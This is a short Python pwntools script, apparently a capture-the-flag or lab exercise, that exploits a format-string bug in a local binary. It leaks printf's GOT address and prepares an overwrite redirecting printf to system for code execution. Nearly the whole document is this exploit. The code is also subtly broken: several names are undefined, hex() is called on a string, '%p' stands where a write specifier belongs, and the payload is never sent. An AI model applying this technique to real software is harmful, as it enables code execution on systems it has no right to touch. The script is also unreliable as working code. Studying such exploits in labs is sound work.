#!/usr/bin/env python

from pwn import *

p = process('./fs-code-exec-32')

"""
To  get beginning of printf stack:
break at target printf.
show x/x $esp
then take address and show as x/20w address
Then find input that you put in.
"""

gotPrintf = p.elf.got['printf']

print(p.recv())

p.sendline(p32(gotPrintf) + "%7$s") #leak data of got as a string

data = p.recv()

libcPrintf = u32(data[10:14]) #cut data of the libc addr of printf

print(hex(data)) #check if data is correct by seeing if last 3 characters are the same as printf in gdb

#calculate offset here:
system = libcPrintf - printfgrab + systemgrab #fill in printfgrab and system grab with addr

buf = p32(gotPrintf) #write first two bytes
buf += p32(gotPrintf + 2) #write next two bytes

lower16 = system & 0xffff

first = lower16 - 8

second = (libc >> 16) - lower16 #shift upper 16 bits to lower 16 bits then subtract lower16 to get correct input

while second < 0:   #avoid negative values
    second += 0x10000

print(hex(system))
print(hex(first))
print(hex(second))

buf += "%" + "%05d" % first + "x"
buf += "%7$p"
buf += "%" + "%05d" % second + "x"
buf += "%8$p"

#export PATH=$PATH:`pwd` in terminal to set path
#backticks will run program and insert output of function as string
